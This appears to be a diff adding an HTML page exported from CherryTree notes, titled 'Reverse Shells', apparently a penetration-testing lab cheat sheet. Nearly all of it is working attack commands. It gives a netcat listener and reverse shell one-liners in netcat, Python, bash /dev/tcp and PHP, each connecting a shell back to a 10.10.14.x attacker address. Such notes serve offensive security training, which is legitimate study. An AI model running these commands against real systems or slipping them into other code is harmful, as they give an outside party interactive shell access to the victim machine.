@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Reverse Shells</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Reverse Shells</h1><br/><br />Listen<br />	<div class="codebox"><pre>nc -nlvp 4444</pre></div><br /><br />Connect <br />   ◇  netcat<br />	<div class="codebox"><pre>nc -nv 10.10.14.30 4444 -e /bin/sh</pre></div><br />   ◇ python<br />   one line	<div class="codebox"><pre>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.30&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</pre></div><br />   multi line<br />   <div class="codebox"><pre>import socket,subprocess,os<br />s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />s.connect((“10.10.14.30”,4444))<br />os.dup2(s.fileno(),0)<br />os.dup2(s.fileno(),1)<br />os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);</pre></div><br />   ◇ python file that execte ntcat<br />   	<div class="codebox"><pre>os.system(&#39;/bin/nc -e /bin/bash 10.10.14.12 4444&#39;)</pre></div><br />   ◇ bash<br />   	<div class="codebox"><pre>/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1</pre></div><br />   ◇ php<br />   	<div class="codebox"><pre>php -r &#39;$sock=fsockopen(&quot;10.10.14.12&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</pre></div></div>
+</body>
+</html>
